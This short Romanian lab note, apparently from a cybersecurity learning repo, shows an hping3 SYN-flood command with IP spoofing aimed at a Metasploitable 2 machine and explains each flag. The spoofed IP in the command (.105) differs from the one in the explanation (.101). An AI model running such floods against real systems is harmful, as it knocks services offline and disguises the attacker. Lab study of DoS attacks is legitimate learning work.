### Atac DoS:
  - [Despre DoS](https://github.com/Dani780-C/Cyber-security/blob/main/learn/info_DoS_attack.md)
  - Pasii atacului: 
    
        hping3 -S 192.168.56.102 -a 192.168.56.105 -p 80 --flood
        
       -S <-> fixeaza flag-ul de SYN  
       192.168.56.102 <-> adresa IP a tintei Metasploitable 2  
       -a 192.168.56.101 <-> IP spoofing (modifica adresa IP in cea data ca parametru)  
       -p 80 <-> portul destinatie este 80  
       --flood <-> trimite pachetele cat se poate de repede fara a astepta un reply  
